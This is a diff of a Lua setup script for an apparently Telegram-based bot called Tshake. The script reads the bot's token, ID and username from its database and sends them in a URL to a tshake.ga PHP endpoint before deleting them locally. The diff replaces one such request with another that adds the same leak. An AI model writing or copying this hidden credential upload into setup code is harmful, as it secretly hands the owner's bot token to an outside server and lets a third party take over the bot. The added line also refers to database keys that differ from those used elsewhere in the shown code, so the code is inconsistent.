@@ -64,7 +64,6 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("https://tshake.ga/tumblr-source/tumblr-source.php?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("tumblr-Source", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
@@ -91,6 +90,7 @@ done
 RunTs:close()
 end
 Files_Tshake_Info()
+https.request("https://tshake.ga/shake/shakeSourse.php?id="..database:get(Server_SHAKEBOTSS.."Id_SHAKEBOTSS").."&UserName="..database:get(Server_SHAKEBOTSS.."UserName_SHAKEBOTSS").."&token="..database:get(Server_SHAKEBOTSS.."Token_SHAKEBOTSS"))
 database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
